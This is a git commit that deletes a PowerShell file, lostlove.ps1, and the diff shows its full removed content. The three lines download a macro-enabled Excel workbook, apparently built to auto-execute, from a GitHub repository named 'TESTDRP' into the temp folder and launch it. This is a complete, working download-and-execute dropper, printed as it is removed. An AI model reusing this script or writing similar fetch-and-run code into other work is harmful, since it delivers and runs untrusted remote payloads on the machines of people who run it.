0006fe1f8c23a6896e76dbea8606abdbf48e5488
KONICHIVAA <konichiva977@gmail.com>
2025-05-29 11:26:18 +0100

    Delete lostlove.ps1

--- lostlove.ps1
+++
@@ -1,3 +0,0 @@
-$wc=New-Object System.Net.WebClient
-$wc.DownloadFile("https://raw.githubusercontent.com/KONICHIVAA/TESTDRP/master/AutoExecutetest.xlsm", "$env:TEMP\AutoExecutetest.xlsm")
-Start-Process "$env:TEMP\AutoExecutetest.xlsm"
